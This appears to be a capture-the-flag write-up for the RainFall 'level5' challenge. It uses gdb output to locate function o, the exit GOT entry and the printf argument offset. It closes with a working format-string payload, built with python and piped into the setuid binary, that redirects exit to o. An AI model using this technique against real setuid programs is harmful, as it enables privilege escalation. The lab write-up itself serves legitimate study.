level5 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
```

level5 rights:
```Shell
level5@RainFall:~$ ls -la level5 
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

The x option of gdb allow us to view the memory  content at a specified address or a variable name, here we print the memory content of `o` to get its address 0x80484a4.
```Shell
(gdb) x o
0x80484a4 <o>:  0x83e58955
```

Disassembling n, we look for the call to the exit function and disassemble the called address. We observe a dereferenced address in the first jump and we print the memory content of it to get the location where the exit function address is stored.
```Shell
(gdb) disas n
Dump of assembler code for function n:
[...]
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
```

We use %p specifier of printf to find which argument of printf correspond to our buffer
```Shell
level5@RainFall:~$ ./level5 
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```

n function:
- buffer[520]
- fgets(buffer)
- printf(buffer)
- exit(1)
o function:
- zsh

replace exit with o using format string

- find the address of o 
- find the address of exit
- find buffer position

o: 0x80484a4
exit: 0x8049838 -> 38980408
buffer: 4

python -c 'print("\x38\x98\x04\x08" + "%134513824d%4$n")' > /tmp/input5

cat /tmp/input5 | ./level5
